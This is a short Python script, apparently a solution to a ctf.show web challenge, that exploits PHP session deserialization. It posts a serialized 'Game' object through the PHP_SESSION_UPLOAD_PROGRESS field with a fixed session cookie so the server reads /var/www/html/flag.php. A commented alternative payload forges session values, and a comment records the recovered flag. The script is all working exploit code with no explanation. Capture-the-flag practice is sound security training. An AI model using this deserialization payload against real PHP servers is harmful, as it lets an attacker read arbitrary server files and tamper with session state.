import re
import requests

url = 'http://897e2bc3-63dd-4efe-801a-17329f24f9b8.challenge.ctf.show/'
session = '1c39019d5f1500fbaa3e40b0c3ff0456'
payload = '|O:4:"Game":1:{s:3:"log";s:22:"/var/www/html/flag.php";}'
# payload = '2|s:1:"2";name|s:1:"1";win|i:100;'
data = {'PHP_SESSION_UPLOAD_PROGRESS':f'{payload}'}
r = requests.post(url=url, data=data, cookies={'PHPSESSID':f'{session}'})
# print(r.text)
flag_match = re.search(r'ctfshow\{[0-9a-z\-]+\}', r.text)
if flag_match:
    flag = flag_match.group(0)
    print(f"Flag found!\n{flag}")
# ctfshow{c2c05129-7600-4aa1-8e57-ca3368afee72}